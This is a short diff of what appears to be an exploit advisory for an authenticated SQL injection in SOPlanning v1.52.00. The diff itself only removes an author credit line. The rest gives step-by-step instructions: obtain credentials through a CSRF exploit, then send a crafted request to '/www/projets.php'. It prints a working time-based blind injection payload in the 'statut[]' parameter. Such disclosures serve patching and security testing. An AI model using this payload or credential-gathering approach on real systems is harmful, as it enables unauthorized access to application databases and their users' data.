@@ -20,9 +20,6 @@ Description: SOPlanning v1.52.00 is vulnerable to Authenticated SQL Injection vi
 
 Instructions: Authenticate to the host, the credentials can be obtained using a CSRF exploit (more info included). Once valid credentials are obtained use either a GET/POST request to send the valid parameters that equal to valid SQLi.
 
-Liquidsky @ Specialized Security Services Inc. (S3) | Shout out to the team!
-
-
 Vulnerable request parameters for request to "/www/projets.php":
 
 filtreGroupeProjet=1&statut[]=todo'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+'Liquidsky'='Liquidsky&rechercheProjet=test
